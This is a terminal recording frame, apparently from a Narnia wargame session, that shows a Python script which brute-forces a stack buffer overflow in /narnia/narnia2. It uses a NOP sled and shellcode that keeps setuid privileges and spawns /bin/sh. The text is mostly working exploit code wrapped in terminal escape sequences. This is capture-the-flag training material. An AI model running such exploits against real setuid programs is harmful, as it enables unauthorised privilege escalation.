[32.503093, "o", "\u001b[1;1H\u001b[35mimport\u001b[m os, struct, subprocess, sys, time\r\r\nsc = \u001b[36mopen\u001b[m(\u001b[31m\"/tmp/l2.bin\"\u001b[m, \u001b[31m\"rb\"\u001b[m).read()\u001b[2;38H\u001b[K\u001b[3;1H\u001b[34m# narnia2: strcpy(buf[128], argv[1]) -> saved ret at offset 132. Stack RWE, no ASLR.\u001b[m\u001b[3;85H\u001b[K\u001b[4;1H\u001b[34m# Shellcode prints PWN!, does setreuid+setuid(euid) so the privilege survives execve,\r\r\n# then execve /bin/sh.\u001b[m\r\r\n\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(sc) <= \u001b[31m128\u001b[m \u001b[33mand\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m sc\r\r\n\u001b[33mdef\u001b[m \u001b[36mpayload_for\u001b[m(addr):\r\r\n    \u001b[33mreturn\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * (\u001b[31m128\u001b[m - \u001b[36mlen\u001b[m(sc)) + sc + \u001b[31mb\"B\"\u001b[m * \u001b[31m4\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, addr)\r\r\n\u001b[33mdef\u001b[m \u001b[36mprobe\u001b[m(addr):\r\r\n    \u001b[34m# argv cannot contain a NUL byte\u001b[m\r\r\n    \u001b[33mif\u001b[m \u001b[31m0\u001b[m \u001b[33min\u001b[m struct.pack(\u001b[31m\"<I\"\u001b[m, addr):\u001b[12;9H\u001b[33mreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    \u001b[33mtry\u001b[m:\u001b[14;9Hp = subprocess.Popen([\u001b[31mb\"/narnia/narnia2\"\u001b[m, payload_for(addr)],\u001b[15;30Hstdin=subprocess.PIPE, stdout=subprocess.PIPE,\u001b[16;30Hstderr=subprocess.STDOUT, env={})\u001b[17;9Hout, _ = p.communicate(\u001b[31mb\"echo PROBE_OK\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m, timeout=\u001b[31m2\u001b[m)\r\r\n    \u001b[33mexcept\u001b[m subprocess.TimeoutExpired:\u001b[19;9Hp.kill()\u001b[20;9Hp.communicate()\u001b[21;9H\u001b[33mreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    \u001b[33mreturn\u001b[m \u001b[31mb\"PROBE_OK\"\u001b[m \u001b[33min\u001b[m out\r\r\nfound = \u001b[36mNone\u001b[m\r\r\nt0 = time.time()\r\r\n\u001b[33mfor\u001b[m addr \u001b[33min\u001b[m \u001b[36mrange\u001b[m(\u001b[31m0xffffd000\u001b[m, \u001b[31m0xffffe800\u001b[m, \u001b[31m4\u001b[m):\r\r\n    \u001b[33mif\u001b[m probe(addr):\u001b[27;9Hfound = addr\u001b[28;9H\u001b[36mprint\u001b[m(\u001b[31m\"HIT at %#x after %d probes (%.1f s)\"\u001b[m % (addr, (addr - \u001b[31m0xffffd000\u001b[m) // \u001b[31m4\u001b[m + \u001b[31m1\u001b[m, time.timee\u001b[29;1H() - t0))\u001b[30;9H\u001b[33mbreak\r\r\nif\u001b[m found \u001b[33mis\u001b[m \u001b[36mNone\u001b[m:\r\r\n    \u001b[36mprint\u001b[m(\u001b[31m\"no address landed in the sled\"\u001b[m)\r\r\n    sys.exit(\u001b[31m1\u001b[m)\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
